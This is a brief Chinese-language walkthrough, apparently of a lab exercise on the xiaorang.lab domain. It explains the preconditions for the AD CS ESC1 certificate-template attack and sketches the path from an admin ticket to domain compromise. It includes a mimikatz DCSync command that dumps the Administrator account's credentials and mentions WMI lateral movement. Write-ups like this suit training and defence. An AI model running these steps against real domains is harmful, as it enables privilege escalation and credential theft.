ESC1利用前提条件：
msPKI-Certificates-Name-Flag:
ENROLLEE_SUPPLIES_SUBJECT
表示基于此证书模板申请新证书的用户可以为其他用户申请证书，即任何用户，包括域管理员用户

PkiExtendedKeyUsage: Client Authentication
表示将基于此证书模板生成的证书可用于对 Active Directory 中的计算机进行身份验证

Enrollment Rights: NT Authority\Authenticated Users
表示允许 Active Directory 中任何经过身份验证的用户请求基于此证书模板生成的新证书
发现了漏洞接下来就跟套公式一样


这里就是把上面的BEGIN开始一直到END CERTIFICATE全部复制下来保存到cert.pem，要你输密码就直接enter就行

这里注意，有个巨坑，win2016不支持openssl3.0以上的证书（aes-256加密），这里我们要用openssl1.1.0的去生成，不然会报密码错误（还有一些玄学问题我也没研究出，如：KDC_ERR_PADATA_TYPE_NOSUPP，不行就多试几次，重置一下环境）

成功拿到ticket，我们的票据也显示的是admin

那我们就那mimikatz抓一波凭据
mimikatz.exe "lsadump::dcsync /domain:xiaorang.lab /user:Administrator" exit

然后就是简单的一波wmi横向
